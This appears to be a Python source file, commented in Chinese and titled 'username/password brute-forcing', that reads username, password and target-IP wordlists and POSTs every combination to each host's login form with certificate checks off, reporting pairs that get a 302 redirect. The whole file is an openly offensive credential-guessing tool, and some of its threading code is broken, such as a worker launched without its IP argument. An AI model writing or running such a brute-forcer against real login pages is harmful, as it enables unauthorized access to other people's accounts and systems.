# 用户名密码爆破
import threading

import requests

username = []
password = []
ip_line = []
success = []


def weakPasswd_r():
    for ip in ip_line:
        for user in username:
            for pwd in password:
                data = {  # 用burp抓包看看要提交什么
                    'username': user,
                    'password': pwd
                }
                req = requests.post("http://" + str(ip), data=data, allow_redirects=False, verify=False)
                print('[*]ip: ' + ip + 'username:' + user + 'password: ' + pwd)
                if req.status_code == 302 and 'login' in req.text and 'Login' in req.text:
                    print('[+] ok: username' + user + 'password' + pwd)


def weakPasswd(ip):
    for user in username:
        for pwd in password:
            data = {  # 用burp抓包看看要提交什么
                'username': user,
                'password': pwd
            }
            req = requests.post("http://" + str(ip), data=data, allow_redirects=False, verify=False)
            print('[*]ip: ' + ip + 'username:' + user + 'password: ' + pwd)
            if req.status_code == 302 and 'login' in req.text and 'Login' in req.text:
                print('[+] ok: username' + user + 'password' + pwd)


def read_username():
    for user in open('E:/github/scan/dictionary/username.txt'):
        user = user.replace('\n', '')
        username.append(user)


def read_password():
    for pwd in open('E:/github/scan/dictionary/password.txt'):
        pwd = pwd.replace("\n", "")
        password.append(pwd)


def read_ip():
    for ip in open('E:/github/scan/dictionary/sql_ip.txt'):
        ip = ip.replace("\n", "")
        ip_line.append(ip)


def thread_ip_username_password():
    threads = []
    t1 = threading.Thread(target=read_ip)
    threads.append(t1)
    t2 = threading.Thread(target=read_password)  # 创建第一个子线程，子线程任务是调用task1函数，函数名后面没有（）
    threads.append(t2)
    t3 = threading.Thread(target=read_username)
    threads.append(t3)
    t4 = threading.Thread(target=weakPasswd)
    threads.append(t4)
    for t in threads:  # 遍历线程列表
        t.daemon = True  # 将线程声明为守护线程，必须在start方法调用之前设置，如果不设置守护线程程序会无线挂起
        t.start()
        t.join()


def thread_username_password(ip):
    print("正在爆破账号密码")
    threads = []
    t1 = threading.Thread(target=read_password)  # 创建第一个子线程，子线程任务是调用task1函数，函数名后面没有（）
    threads.append(t1)
    t2 = threading.Thread(target=read_username())
    threads.append(t2)
    t3 = threading.Thread(target=weakPasswd, args=(ip,))
    threads.append(t3)
    for t in threads:  # 遍历线程列表
        t.daemon = True  # 将线程声明为守护线程，必须在start方法调用之前设置，如果不设置守护线程程序会无线挂起
        t.start()
        t.join()
